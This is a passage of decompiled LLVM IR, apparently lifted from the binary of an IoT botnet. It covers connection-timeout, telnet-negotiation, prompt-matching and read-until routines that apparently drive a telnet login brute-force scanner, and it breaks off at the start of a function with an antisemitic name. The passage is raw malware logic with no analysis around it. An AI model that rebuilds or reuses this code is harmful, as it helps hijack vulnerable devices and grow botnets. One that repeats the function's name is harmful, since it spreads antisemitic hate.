  %v1_15034 = call i32 @close(i32 %v2_1502c)
  br label %dec_label_pc_15038

dec_label_pc_15038:                               ; preds = %entry, %dec_label_pc_15028
  %v2_15040 = add i32 %tmp, 16
  %v3_15040 = inttoptr i32 %v2_15040 to i32*
  store i32 0, i32* %v3_15040, align 4
  %v3_15044 = load i32, i32* %stack_var_-24, align 4
  %v1_15050 = trunc i32 %v3_15044 to i8
  %v3_15050 = add i32 %tmp, 8
  %v4_15050 = inttoptr i32 %v3_15050 to i8*
  store i8 %v1_15050, i8* %v4_15050, align 1
  %v1_15058 = add i32 %tmp, 28
  %v2_15058 = inttoptr i32 %v1_15058 to i32*
  %v3_15058 = load i32, i32* %v2_15058, align 4
  store i32 %v3_15058, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_15068 = call i32 @__GI_memset()
  ret i32 %v0_15068

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_15038, { 1, 0 }
}

define i32 @reset_ipstate(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1507c = load i32, i32* @fp, align 4
  %v2_15094 = inttoptr i32 %arg1 to i32*
  %v3_15094 = call i32 @advance_state(i32* %v2_15094, i32 0)
  %v3_150a0 = add i32 %arg1, 9
  %v4_150a0 = inttoptr i32 %v3_150a0 to i8*
  store i8 1, i8* %v4_150a0, align 1
  store i32 %v3_1507c, i32* @fp, align 4
  ret i32 %v3_15094

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_150b4 = load i32, i32* @fp, align 4
  %v3_150cc = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([12 x i8*]* @global_var_452f4.644 to i32))
  store i32 %v3_150b4, i32* @fp, align 4
  ret i32 %v3_150cc
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_150ec = load i32, i32* @fp, align 4
  %v3_15104 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_452d4.653 to i32))
  store i32 %v3_150ec, i32* @fp, align 4
  ret i32 %v3_15104

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 86316, i32* %stack_var_-4, align 4
  %v2_15128 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_15128, i32* @fp, align 4
  %v1_15138 = call i32 @contains_success(i32 %arg1)
  %v2_15140 = icmp eq i32 %v1_15138, 0
  br i1 %v2_15140, label %dec_label_pc_15148, label %dec_label_pc_15170

dec_label_pc_15148:                               ; preds = %entry
  %v1_1514c = call i32 @contains_fail(i32 %arg1)
  %v2_15154 = icmp ne i32 %v1_1514c, 0
  %. = zext i1 %v2_15154 to i32
  br label %dec_label_pc_15170

dec_label_pc_15170:                               ; preds = %dec_label_pc_15148, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_15148 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_151b4

dec_label_pc_151b4:                               ; preds = %dec_label_pc_151b4, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_151b8, %dec_label_pc_151b4 ]
  %v1_151b8 = add i32 %stack_var_-24.0, 1
  %v3_151c4 = mul i32 %v1_151b8, 4
  %v2_151d0 = add i32 %v3_151c4, %arg2
  %v1_151d4 = inttoptr i32 %v2_151d0 to i32*
  %v2_151d4 = load i32, i32* %v1_151d4, align 4
  %v2_151d8 = icmp eq i32 %v2_151d4, 0
  br i1 %v2_151d8, label %dec_label_pc_15234.preheader, label %dec_label_pc_151b4

dec_label_pc_15234.preheader:                     ; preds = %dec_label_pc_151b4
  %v3_1520c = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_15234

dec_label_pc_151ec:                               ; preds = %dec_label_pc_15234
  %v3_151f0 = mul i32 %storemerge2, 4
  %v2_151fc = add i32 %v3_151f0, %arg2
  %v1_15200 = inttoptr i32 %v2_151fc to i32*
  %v2_15200 = load i32, i32* %v1_15200, align 4
  %v4_1520c = call i32 @strcasestr(i8* %v3_1520c, i32 %v2_15200, i32 %v3_151f0)
  %v2_15214 = icmp eq i32 %v4_1520c, 0
  %v1_1522c = add nuw i32 %storemerge2, 1
  br i1 %v2_15214, label %dec_label_pc_15234, label %dec_label_pc_1524c

dec_label_pc_15234:                               ; preds = %dec_label_pc_151ec, %dec_label_pc_15234.preheader
  %storemerge2 = phi i32 [ %v1_1522c, %dec_label_pc_151ec ], [ 0, %dec_label_pc_15234.preheader ]
  %v5_15240 = icmp slt i32 %storemerge2, %v1_151b8
  br i1 %v5_15240, label %dec_label_pc_151ec, label %dec_label_pc_1524c

dec_label_pc_1524c:                               ; preds = %dec_label_pc_15234, %dec_label_pc_151ec
  %storemerge = phi i32 [ 1, %dec_label_pc_151ec ], [ 0, %dec_label_pc_15234 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_151b8, { 1, 0, 2 }
}

define i32 @connectotalTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15264 = load i32, i32* @fp, align 4
  store i32 %v3_15264, i32* %stack_var_-16, align 4
  %v13_15264 = ptrtoint i32* %stack_var_-16 to i32
  %v3_1528c = call i32 @fcntl(i32 %arg1, i32 3, i32 0)
  %v1_1529c = or i32 %v3_1528c, 2048
  store i32 %v1_1529c, i32* @r3, align 4
  %v3_152b0 = call i32 @fcntl(i32 %arg1, i32 4, i32 %v1_1529c)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_152c4 = urem i32 %arg3, 65536
  %v1_152cc = call i32 @__GI_htons(i32 %v3_152c4)
  %v3_152ec = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_152f4 = icmp eq i32 %v3_152ec, 0
  br i1 %v2_152f4, label %dec_label_pc_15308, label %dec_label_pc_152fc

dec_label_pc_152fc:                               ; preds = %entry
  br label %dec_label_pc_154c0

dec_label_pc_15308:                               ; preds = %entry
  %v2_1530c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1530c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_1531c = call i32 @__GI_memset()
  %v2_15320 = ptrtoint i32* %stack_var_-48 to i32
  %v3_15330 = call i32 @connect(i32 %arg1, i32 %v2_15320, i32 16)
  store i32 %v3_15330, i32* @r3, align 4
  %v1_15340 = icmp slt i32 %v3_15330, 0
  br i1 %v1_15340, label %dec_label_pc_15348, label %dec_label_pc_15484

dec_label_pc_15348:                               ; preds = %dec_label_pc_15308
  %v0_15348 = call i32 @__errno_location()
  %v1_15350 = inttoptr i32 %v0_15348 to i32*
  %v2_15350 = load i32, i32* %v1_15350, align 4
  %v7_15354 = icmp eq i32 %v2_15350, 115
  br i1 %v7_15354, label %dec_label_pc_15380.lr.ph, label %dec_label_pc_15478

dec_label_pc_15380.lr.ph:                         ; preds = %dec_label_pc_15348
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_1536c = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_15380

dec_label_pc_15380:                               ; preds = %dec_label_pc_15380.lr.ph, %dec_label_pc_15380
  %storemerge14 = phi i32 [ 0, %dec_label_pc_15380.lr.ph ], [ %v1_15394, %dec_label_pc_15380 ]
  %v5_1538c = mul nuw nsw i32 %storemerge14, 4
  %v6_1538c = add i32 %v5_1538c, %v2_1536c
  %v7_1538c = inttoptr i32 %v6_1538c to i32*
  store i32 0, i32* %v7_1538c, align 4
  %v1_15394 = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_15394, 32
  br i1 %tmp28, label %dec_label_pc_15380, label %dec_label_pc_153a8

dec_label_pc_153a8:                               ; preds = %dec_label_pc_15380
  %v3_153ac = udiv i32 %arg1, 32
  %v3_153b8 = mul nuw nsw i32 %v3_153ac, 4
  %v2_153c0 = add nsw i32 %v3_153b8, -160
  %v2_153c4 = add i32 %v2_153c0, %v13_15264
  %v1_153c8 = inttoptr i32 %v2_153c4 to i32*
  %v2_153c8 = load i32, i32* %v1_153c8, align 4
  %v1_153d0 = urem i32 %arg1, 32
  %v6_153d8 = shl i32 1, %v1_153d0
  %v2_153dc = or i32 %v2_153c8, %v6_153d8
  store i32 %v2_153dc, i32* %v1_153c8, align 4
  %v1_153fc = add i32 %arg1, 1
  %v2_15404 = ptrtoint i32* %stack_var_-184 to i32
  %v5_1541c = call i32 @__libc_select(i32 %v1_153fc, i32 0, i32 %v2_1536c, i32 0, i32 %v2_15404)
  %tmp29 = icmp slt i32 %v5_1541c, 1
  br i1 %tmp29, label %dec_label_pc_1546c, label %dec_label_pc_1542c

dec_label_pc_1542c:                               ; preds = %dec_label_pc_153a8
  store i32 4, i32* %stack_var_-188, align 4
  %v2_15434 = ptrtoint i32* %stack_var_-192 to i32
  %v2_15438 = ptrtoint i32* %stack_var_-188 to i32
  %v5_15450 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_15434, i32 %v2_15438)
  %v3_15454 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_15454, i32* @r3, align 4
  %v2_15458 = icmp eq i32 %v3_15454, 0
  br i1 %v2_15458, label %dec_label_pc_15484, label %dec_label_pc_15460

dec_label_pc_15460:                               ; preds = %dec_label_pc_1542c
  br label %dec_label_pc_154c0

dec_label_pc_1546c:                               ; preds = %dec_label_pc_153a8
  br label %dec_label_pc_154c0

dec_label_pc_15478:                               ; preds = %dec_label_pc_15348
  br label %dec_label_pc_154c0

dec_label_pc_15484:                               ; preds = %dec_label_pc_15308, %dec_label_pc_1542c
  %v3_15490 = call i32 @fcntl(i32 %arg1, i32 3, i32 0)
  %v1_154a0 = and i32 %v3_15490, -2049
  store i32 %v1_154a0, i32* @r3, align 4
  %v3_154b4 = call i32 @fcntl(i32 %arg1, i32 4, i32 %v1_154a0)
  br label %dec_label_pc_154c0

dec_label_pc_154c0:                               ; preds = %dec_label_pc_15478, %dec_label_pc_1546c, %dec_label_pc_15460, %dec_label_pc_152fc, %dec_label_pc_15484
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_1546c ], [ 1, %dec_label_pc_15484 ], [ 0, %dec_label_pc_15460 ], [ 0, %dec_label_pc_15478 ], [ 0, %dec_label_pc_152fc ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_1536c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 (i32, i32*)* @getHost, { 0, 2, 3, 1 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_154c0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_15484, { 1, 0 }
  uselistorder label %dec_label_pc_15380, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_154f4 = add i32 %arg2, 1
  %v1_154f8 = inttoptr i32 %v1_154f4 to i8*
  %v2_154f8 = load i8, i8* %v1_154f8, align 1
  %v7_15504 = icmp ult i8 %v2_154f8, -5
  br i1 %v7_15504, label %dec_label_pc_15650, label %dec_label_pc_1550c

dec_label_pc_1550c:                               ; preds = %entry
  %v7_15514 = icmp eq i8 %v2_154f8, -1
  br i1 %v7_15514, label %dec_label_pc_15518, label %dec_label_pc_15534

dec_label_pc_15518:                               ; preds = %dec_label_pc_1550c
  br label %dec_label_pc_15650

dec_label_pc_15534:                               ; preds = %dec_label_pc_1550c
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_1553c = ptrtoint i8* %stack_var_-17 to i32
  %v5_15550 = call i32 @send(i32 %arg1, i32 %v2_1553c, i32 1, i32 16384)
  %v2_1555c = load i8, i8* %v1_154f8, align 1
  %v7_15560 = icmp eq i8 %v2_1555c, -4
  br i1 %v7_15560, label %dec_label_pc_15568, label %dec_label_pc_15574

dec_label_pc_15568:                               ; preds = %dec_label_pc_15534
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_15614

dec_label_pc_15574:                               ; preds = %dec_label_pc_15534
  %v2_1557c = load i8, i8* %v1_154f8, align 1
  %v7_15580 = icmp eq i8 %v2_1557c, -2
  br i1 %v7_15580, label %dec_label_pc_15588, label %dec_label_pc_15594

dec_label_pc_15588:                               ; preds = %dec_label_pc_15574
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_15614

dec_label_pc_15594:                               ; preds = %dec_label_pc_15574
  %v2_1559c = load i8, i8* %v1_154f8, align 1
  %v7_155a0 = icmp eq i8 %v2_1559c, 3
  %v7_155b4 = icmp eq i8 %v2_1559c, -3
  br i1 %v7_155a0, label %dec_label_pc_155a8, label %dec_label_pc_155e0

dec_label_pc_155a8:                               ; preds = %dec_label_pc_15594
  br i1 %v7_155b4, label %dec_label_pc_155bc, label %dec_label_pc_155c8

dec_label_pc_155bc:                               ; preds = %dec_label_pc_155a8
  br label %dec_label_pc_155d0

dec_label_pc_155c8:                               ; preds = %dec_label_pc_155a8
  br label %dec_label_pc_155d0

dec_label_pc_155d0:                               ; preds = %dec_label_pc_155bc, %dec_label_pc_155c8
  %storemerge = phi i8 [ -3, %dec_label_pc_155c8 ], [ -5, %dec_label_pc_155bc ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_15614

dec_label_pc_155e0:                               ; preds = %dec_label_pc_15594
  br i1 %v7_155b4, label %dec_label_pc_155f4, label %dec_label_pc_15600

dec_label_pc_155f4:                               ; preds = %dec_label_pc_155e0
  br label %dec_label_pc_15608

dec_label_pc_15600:                               ; preds = %dec_label_pc_155e0
  br label %dec_label_pc_15608

dec_label_pc_15608:                               ; preds = %dec_label_pc_155f4, %dec_label_pc_15600
  %storemerge4 = phi i8 [ -2, %dec_label_pc_15600 ], [ -4, %dec_label_pc_155f4 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_15614

dec_label_pc_15614:                               ; preds = %dec_label_pc_155d0, %dec_label_pc_15588, %dec_label_pc_15568, %dec_label_pc_15608
  %v4_15628 = call i32 @send(i32 %arg1, i32 %v2_1553c, i32 1, i32 16384)
  %v1_15630 = add i32 %arg2, 2
  %v4_15644 = call i32 @send(i32 %arg1, i32 %v1_15630, i32 1, i32 16384)
  br label %dec_label_pc_15650

dec_label_pc_15650:                               ; preds = %dec_label_pc_15518, %dec_label_pc_15614, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_15650, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15614, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15608, { 1, 0 }
  uselistorder label %dec_label_pc_155d0, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_15684 = call i32 @strlen(i8* %arg1)
  %v2_156cc = add i32 %v3_15684, %tmp
  br label %dec_label_pc_157a0

dec_label_pc_156a4:                               ; preds = %dec_label_pc_1572c, %dec_label_pc_15708, %dec_label_pc_156e4, %dec_label_pc_156c0
  %v1_156a8 = add nsw i32 %stack_var_-28.014, 1
  %v7_156bc = icmp sgt i32 %v3_15684, %v1_156a8
  br i1 %v7_156bc, label %dec_label_pc_156c0, label %dec_label_pc_15750

dec_label_pc_156c0:                               ; preds = %dec_label_pc_156b0.preheader, %dec_label_pc_156a4
  %stack_var_-28.014 = phi i32 [ %v1_156a8, %dec_label_pc_156a4 ], [ %stack_var_-28.1, %dec_label_pc_156b0.preheader ]
  %v2_156d4 = sub i32 %v2_156cc, %stack_var_-28.014
  %v1_156d8 = inttoptr i32 %v2_156d4 to i8*
  %v2_156d8 = load i8, i8* %v1_156d8, align 1
  %v2_156dc = icmp eq i8 %v2_156d8, 0
  br i1 %v2_156dc, label %dec_label_pc_156a4, label %dec_label_pc_156e4

dec_label_pc_156e4:                               ; preds = %dec_label_pc_156c0
  %v2_156fc = load i8, i8* %v1_156d8, align 1
  %v7_15700 = icmp eq i8 %v2_156fc, 32
  br i1 %v7_15700, label %dec_label_pc_156a4, label %dec_label_pc_15708

dec_label_pc_15708:                               ; preds = %dec_label_pc_156e4
  %v2_15720 = load i8, i8* %v1_156d8, align 1
  %v7_15724 = icmp eq i8 %v2_15720, 13
  br i1 %v7_15724, label %dec_label_pc_156a4, label %dec_label_pc_1572c

dec_label_pc_1572c:                               ; preds = %dec_label_pc_15708
  %v2_15744 = load i8, i8* %v1_156d8, align 1
  %v7_15748 = icmp eq i8 %v2_15744, 10
  br i1 %v7_15748, label %dec_label_pc_156a4, label %dec_label_pc_15750

dec_label_pc_15750:                               ; preds = %dec_label_pc_1572c, %dec_label_pc_156a4, %dec_label_pc_156b0.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_156b0.preheader ], [ %stack_var_-28.014, %dec_label_pc_1572c ], [ %v1_156a8, %dec_label_pc_156a4 ]
  %v2_15764 = sub i32 %v2_156cc, %stack_var_-28.0.lcssa
  %v1_15768 = inttoptr i32 %v2_15764 to i8*
  %v2_15768 = load i8, i8* %v1_15768, align 1
  %v2_15778 = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_385e4.655 to i32)
  %v1_1577c = inttoptr i32 %v2_15778 to i8*
  %v2_1577c = load i8, i8* %v1_1577c, align 1
  %v9_15780 = icmp eq i8 %v2_15768, %v2_1577c
  %v1_15798 = add i32 %storemerge3, 1
  br i1 %v9_15780, label %dec_label_pc_157c0, label %dec_label_pc_157a0

dec_label_pc_157a0:                               ; preds = %dec_label_pc_15750, %entry
  %stack_var_-28.1 = phi i32 [ 0, %entry ], [ %stack_var_-28.0.lcssa, %dec_label_pc_15750 ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_15798, %dec_label_pc_15750 ]
  %v3_157a8 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_385e4.655, i32 0, i32 0))
  %v3_157b0 = icmp ult i32 %storemerge3, %v3_157a8
  br i1 %v3_157b0, label %dec_label_pc_156b0.preheader, label %dec_label_pc_157c0

dec_label_pc_156b0.preheader:                     ; preds = %dec_label_pc_157a0
  %v7_156bc13 = icmp sgt i32 %v3_15684, %stack_var_-28.1
  br i1 %v7_156bc13, label %dec_label_pc_156c0, label %dec_label_pc_15750

dec_label_pc_157c0:                               ; preds = %dec_label_pc_157a0, %dec_label_pc_15750
  %storemerge4 = phi i32 [ 1, %dec_label_pc_15750 ], [ 0, %dec_label_pc_157a0 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_15684, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15750, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_157dc = load i32, i32* @fp, align 4
  store i32 %v3_157dc, i32* %stack_var_-16, align 4
  %v13_157dc = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_1582c = ptrtoint i32* %stack_var_-168 to i32
  %v3_1586c = udiv i32 %arg1, 32
  %v3_15878 = mul nuw nsw i32 %v3_1586c, 4
  %v1_15890 = urem i32 %arg1, 32
  %v6_15898 = shl i32 1, %v1_15890
  %v1_158bc = add i32 %arg1, 1
  %v2_158c4 = ptrtoint i32* %stack_var_-176 to i32
  %v6_159e4 = inttoptr i32 %arg2 to i8*
  %v2_159f8 = icmp eq i32 %arg3, 0
  %v1_15a04 = inttoptr i32 %arg6 to i8*
  %v5_15a48 = icmp sgt i32 %arg5, 0
  %v2_15880 = add nsw i32 %v3_15878, -152
  %v2_15884 = add i32 %v2_15880, %v13_157dc
  %v1_15888 = inttoptr i32 %v2_15884 to i32*
  br label %dec_label_pc_15a20

dec_label_pc_15840.lr.ph:                         ; preds = %dec_label_pc_15a34, %dec_label_pc_15a40
  br label %dec_label_pc_15840

dec_label_pc_15840:                               ; preds = %dec_label_pc_15840.lr.ph, %dec_label_pc_15840
  %storemerge27 = phi i32 [ 0, %dec_label_pc_15840.lr.ph ], [ %v1_15854, %dec_label_pc_15840 ]
  %v5_1584c = mul nuw nsw i32 %storemerge27, 4
  %v6_1584c = add i32 %v5_1584c, %v2_1582c
  %v7_1584c = inttoptr i32 %v6_1584c to i32*
  store i32 0, i32* %v7_1584c, align 4
  %v1_15854 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_15854, 32
  br i1 %tmp30, label %dec_label_pc_15840, label %dec_label_pc_15868

dec_label_pc_15868:                               ; preds = %dec_label_pc_15840
  %v2_15888 = load i32, i32* %v1_15888, align 4
  %v2_1589c = or i32 %v2_15888, %v6_15898
  store i32 %v2_1589c, i32* %v1_15888, align 4
  %v5_158d8 = call i32 @__libc_select(i32 %v1_158bc, i32 %v2_1582c, i32 0, i32 0, i32 %v2_158c4)
  %tmp31 = icmp slt i32 %v5_158d8, 1
  br i1 %tmp31, label %dec_label_pc_15a64, label %dec_label_pc_158e8

dec_label_pc_158e8:                               ; preds = %dec_label_pc_15868
  %v2_158f4 = add i32 %stack_var_-40.0, %arg6
  %v5_158f8 = inttoptr i32 %v2_158f4 to i8*
  %v6_1590c = call i32 @recv(i32 %arg1, i32 %v2_158f4, i32 1, i32 0)
  %v7_1591c = icmp eq i32 %v6_1590c, -1
  br i1 %v7_1591c, label %dec_label_pc_15930, label %dec_label_pc_15924

dec_label_pc_15924:                               ; preds = %dec_label_pc_158e8
  %v2_15928 = icmp eq i32 %v6_1590c, 0
  br i1 %v2_15928, label %dec_label_pc_15930, label %dec_label_pc_1593c

dec_label_pc_15930:                               ; preds = %dec_label_pc_15924, %dec_label_pc_158e8
  br label %dec_label_pc_15a6c

dec_label_pc_1593c:                               ; preds = %dec_label_pc_15924
  %v2_15944 = add i32 %v6_1590c, %stack_var_-40.0
  %v2_15950 = load i8, i8* %v5_158f8, align 1
  %v2_15954 = icmp eq i8 %v2_15950, -1
  br i1 %v2_15954, label %dec_label_pc_1595c, label %dec_label_pc_159dc

dec_label_pc_1595c:                               ; preds = %dec_label_pc_1593c
  %v1_15960 = add i32 %v2_158f4, 1
  %v5_15974 = call i32 @recv(i32 %arg1, i32 %v1_15960, i32 2, i32 0)
  %v7_15984 = icmp eq i32 %v5_15974, -1
  br i1 %v7_15984, label %dec_label_pc_15998, label %dec_label_pc_1598c

dec_label_pc_1598c:                               ; preds = %dec_label_pc_1595c
  %v2_15990 = icmp eq i32 %v5_15974, 0
  br i1 %v2_15990, label %dec_label_pc_15998, label %dec_label_pc_159a4

dec_label_pc_15998:                               ; preds = %dec_label_pc_1598c, %dec_label_pc_1595c
  br label %dec_label_pc_15a6c

dec_label_pc_159a4:                               ; preds = %dec_label_pc_1598c
  %v2_159ac = add i32 %v5_15974, %v2_15944
  %v5_159c0 = call i32 @negotiate(i32 %arg1, i32 %v2_158f4, i32 3, i32 %v2_159ac, i32 %v2_159ac)
  %v2_159c8 = icmp eq i32 %v5_159c0, 0
  br i1 %v2_159c8, label %dec_label_pc_159d0, label %dec_label_pc_15a20

dec_label_pc_159d0:                               ; preds = %dec_label_pc_159a4
  br label %dec_label_pc_15a6c

dec_label_pc_159dc:                               ; preds = %dec_label_pc_1593c
  %v3_15950 = zext i8 %v2_15950 to i32
  %v7_159e4 = call i32 @strstr(i32 %arg6, i8* %v6_159e4, i32 %stack_var_-40.0, i32 %v3_15950, i32 %v2_15944, i32 %v6_1590c)
  %v2_159ec = icmp eq i32 %v7_159e4, 0
  br i1 %v2_159ec, label %dec_label_pc_159f4, label %dec_label_pc_15a58

dec_label_pc_159f4:                               ; preds = %dec_label_pc_159dc
  br i1 %v2_159f8, label %dec_label_pc_15a20, label %dec_label_pc_15a00

dec_label_pc_15a00:                               ; preds = %dec_label_pc_159f4
  %v2_15a04 = call i32 @matchPrompt(i8* %v1_15a04)
  %v2_15a0c = icmp eq i32 %v2_15a04, 0
  br i1 %v2_15a0c, label %dec_label_pc_15a20, label %dec_label_pc_15a58

dec_label_pc_15a20:                               ; preds = %dec_label_pc_159a4, %dec_label_pc_15a00, %dec_label_pc_159f4, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_159ac, %dec_label_pc_159a4 ], [ %v2_15944, %dec_label_pc_159f4 ], [ %v2_15944, %dec_label_pc_15a00 ]
  %v1_15a24 = add i32 %stack_var_-40.0, 2
  %v6_15a30 = icmp slt i32 %v1_15a24, %arg7
  br i1 %v6_15a30, label %dec_label_pc_15a34, label %dec_label_pc_15a64

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a20
  %v3_15a34 = load i32, i32* %stack_var_-176, align 4
  %v5_15a3c = icmp sgt i32 %v3_15a34, 0
  br i1 %v5_15a3c, label %dec_label_pc_15840.lr.ph, label %dec_label_pc_15a40

dec_label_pc_15a40:                               ; preds = %dec_label_pc_15a34
  br i1 %v5_15a48, label %dec_label_pc_15840.lr.ph, label %dec_label_pc_15a64

dec_label_pc_15a58:                               ; preds = %dec_label_pc_159dc, %dec_label_pc_15a00
  br label %dec_label_pc_15a6c

dec_label_pc_15a64:                               ; preds = %dec_label_pc_15868, %dec_label_pc_15a40, %dec_label_pc_15a20
  br label %dec_label_pc_15a6c

dec_label_pc_15a6c:                               ; preds = %dec_label_pc_15a58, %dec_label_pc_159d0, %dec_label_pc_15998, %dec_label_pc_15930, %dec_label_pc_15a64
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_15a64 ], [ 1, %dec_label_pc_15a58 ], [ 0, %dec_label_pc_15930 ], [ 0, %dec_label_pc_15998 ], [ 0, %dec_label_pc_159d0 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 3, 1, 0, 2 }
  uselistorder i32 %v5_15974, { 1, 2, 0 }
  uselistorder i8 %v2_15950, { 1, 0 }
  uselistorder i32 %v2_15944, { 0, 1, 3, 2 }
  uselistorder i32 %v6_1590c, { 2, 1, 3, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_1582c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_15a6c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_15a64, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15a58, { 1, 0 }
  uselistorder label %dec_label_pc_15a20, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15840, { 1, 0 }
  uselistorder label %dec_label_pc_15840.lr.ph, { 1, 0 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_15a9c = icmp sgt i32 %arg1, 2
  br i1 %v8_15a9c, label %dec_label_pc_15aac, label %dec_label_pc_15abc

dec_label_pc_15aac:                               ; preds = %entry
  %v1_15ab0 = call i32 @close(i32 %arg1)
  br label %dec_label_pc_15abc

dec_label_pc_15abc:                               ; preds = %entry, %dec_label_pc_15aac
  %storemerge1 = phi i32 [ 0, %dec_label_pc_15aac ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_15abc, { 1, 0 }
}

define i32 @BurnTheJews(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-616 = alloca i32, align 4
  %stack_var_-648 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_15ad0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_15ad0, i32* %ip.global-to-local, align 4
